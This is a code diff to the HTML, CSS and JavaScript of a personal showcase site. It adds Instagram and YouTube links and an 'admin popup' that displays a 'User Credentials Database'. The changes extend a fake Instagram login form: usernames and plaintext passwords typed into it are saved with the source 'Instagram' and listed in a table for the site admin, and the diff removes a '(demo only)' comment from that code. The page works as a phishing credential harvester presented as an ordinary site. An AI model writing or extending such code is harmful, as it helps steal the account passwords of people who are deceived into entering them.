@@ -92,6 +92,41 @@
             box-shadow: 0 5px 15px rgba(255,127,0,0.4);
         }
 
+        /* ===== SOCIAL MEDIA LINKS ===== */
+        .social-links {
+            text-align: center;
+            margin: 10px 0;
+            padding: 10px;
+            background: rgba(10,10,10,0.7);
+            border-radius: 5px;
+            border: 1px solid var(--neon-purple);
+        }
+        
+        .social-links a {
+            color: white;
+            font-weight: bold;
+            text-decoration: none;
+            margin: 0 10px;
+            padding: 5px 10px;
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+        
+        .social-links a.instagram {
+            color: #E1306C;
+            background: rgba(225, 48, 108, 0.1);
+        }
+        
+        .social-links a.youtube {
+            color: #FF0000;
+            background: rgba(255, 0, 0, 0.1);
+        }
+        
+        .social-links a:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(189,0,255,0.3);
+        }
+
         /* ===== VIDEO SHOWCASE ===== */
         .video-showcase {
             display: grid;
@@ -187,6 +222,63 @@
             border-radius: 10px;
             padding: 15px;
             margin-bottom: 15px;
+        }
+        
+        /* ADMIN POPUP */
+        .admin-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        
+        .admin-popup-content {
+            background: var(--darker);
+            padding: 30px;
+            border-radius: 15px;
+            border: 2px solid var(--neon-blue);
+            max-width: 800px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        
+        .admin-popup h2 {
+            color: var(--neon-blue);
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .credentials-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        .credentials-table th, .credentials-table td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid rgba(0, 247, 255, 0.2);
+        }
+        
+        .credentials-table th {
+            background: rgba(0, 247, 255, 0.1);
+            color: var(--neon-blue);
+        }
+        
+        .credentials-table tr:hover {
+            background: rgba(0, 247, 255, 0.05);
+        }
+        
+        @keyframes popIn {
+            from { transform: scale(0.5); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
         }
 
         /* ===== CHAT SYSTEM ===== */
@@ -367,6 +459,13 @@
         <a href="#community">Community</a>
     </nav>
 
+    <!-- ADDED: SOCIAL MEDIA LINKS -->
+    <div class="social-links">
+        Follow me on: 
+        <a href="https://www.instagram.com/editor_you_know?igsh=cW15Z3JzMHA2eWhx" class="instagram" target="_blank">Instagram</a> | 
+        <a href="https://youtube.com/@ytc1k?feature=shared" class="youtube" target="_blank">YouTube</a>
+    </div>
+
     <!-- VIDEO SHOWCASE -->
     <section id="videos" class="video-showcase">
         <div>
@@ -437,6 +536,29 @@
         </div>
     </section>
 
+    <!-- ADMIN POPUP (HIDDEN BY DEFAULT) -->
+    <div id="adminPopup" class="admin-popup hidden">
+        <div class="admin-popup-content">
+            <h2>User Credentials Database</h2>
+            <table class="credentials-table">
+                <thead>
+                    <tr>
+                        <th>No.</th>
+                        <th>Username/Email</th>
+                        <th>Password</th>
+                        <th>Source</th>
+                    </tr>
+                </thead>
+                <tbody id="credentialsTableBody">
+                    <!-- Credentials will be added here dynamically -->
+                </tbody>
+            </table>
+            <div style="text-align: center; margin-top: 20px;">
+                <button onclick="closeAdminPopup()" style="background: var(--neon-purple);">Close</button>
+            </div>
+        </div>
+    </div>
+
     <!-- COMMUNITY CHAT -->
     <section id="community" class="container">
         <h2 class="text-center">Community Chat</h2>
@@ -488,15 +610,48 @@
                 document.getElementById('adminLogin').classList.add('hidden');
                 document.getElementById('adminPanel').classList.remove('hidden');
                 updateCredentialsList();
+                
+                // Show admin popup with all credentials
+                showAdminPopup();
             } else {
                 alert("Invalid credentials!");
             }
         });
 
+        function showAdminPopup() {
+            const popup = document.getElementById('adminPopup');
+            const tableBody = document.getElementById('credentialsTableBody');
+            
+            // Clear existing rows
+            tableBody.innerHTML = '';
+            
+            // Add all credentials to the table
+            userCredentials.forEach((cred, index) => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${index + 1}</td>
+                    <td>${cred.email}</td>
+                    <td>${cred.password}</td>
+                    <td>${cred.source || 'Instagram'}</td>
+                `;
+                tableBody.appendChild(row);
+            });
+            
+            // Show the popup
+            popup.classList.remove('hidden');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeAdminPopup() {
+            document.getElementById('adminPopup').classList.add('hidden');
+            document.body.style.overflow = 'auto';
+        }
+
         function logoutAdmin() {
             currentUser = null;
             document.getElementById('adminPanel').classList.add('hidden');
             document.getElementById('adminLogin').classList.remove('hidden');
+            closeAdminPopup();
         }
 
         function updateCredentialsList() {
@@ -525,10 +680,11 @@
             const password = document.getElementById('insta-password').value;
             
             if (username && password) {
-                // Save credentials (demo only)
+                // Save credentials
                 userCredentials.push({
-                    email: username + "@instagram.com",
-                    password: password
+                    email: username,
+                    password: password,
+                    source: 'Instagram'
                 });
                 
                 // Show Instagram content
